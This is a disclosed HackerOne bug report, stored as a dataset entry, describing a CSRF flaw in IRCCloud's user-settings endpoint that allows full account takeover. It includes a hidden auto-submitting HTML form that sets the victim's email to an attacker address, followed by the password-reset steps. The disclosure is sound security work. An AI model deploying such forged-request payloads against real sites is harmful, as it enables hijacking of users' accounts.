---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '6910'
original_report_id: '6910'
title: Full account takeover using CSRF and password reset
weakness: Cross-Site Request Forgery (CSRF)
team_handle: irccloud
created_at: '2014-04-10T23:05:03.401Z'
disclosed_at: '2014-04-14T13:43:11.749Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Full account takeover using CSRF and password reset

## Metadata

- HackerOne Report ID: 6910
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: irccloud
- Disclosed At: 2014-04-14T13:43:11.749Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

An attacker could take over any user account by doing the following things.

1) Exploit a CSRF vulnerability in `/chat/user-settings`.  An attacker creates a webpage on a (non-IRCCloud) website (for example: http://example.com/cat.html) and inserts a (hidden) form like this:

    <form action="https://www.irccloud.com/chat/user-settings" method="post">
    <input type="hidden" name="email" value="hacker@example.com">
    <input type="hidden" name="realname" value="Doesn't Matter">
    <input type="hidden" name="hwords" value="">
    <input type="hidden" name="autoaway" value="1">
    <input type="hidden" name="reqid" value="1">
    <input type="hidden" name="session" value="">
    <input type="submit"> 
    <!-- some code to make the form submit automatically, in the  background-->
    </form>

2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to `hacker@example.com`.

3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).

4) The attacker can now use the password reset functionality to change the password of the victim's account and gain full control over the account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
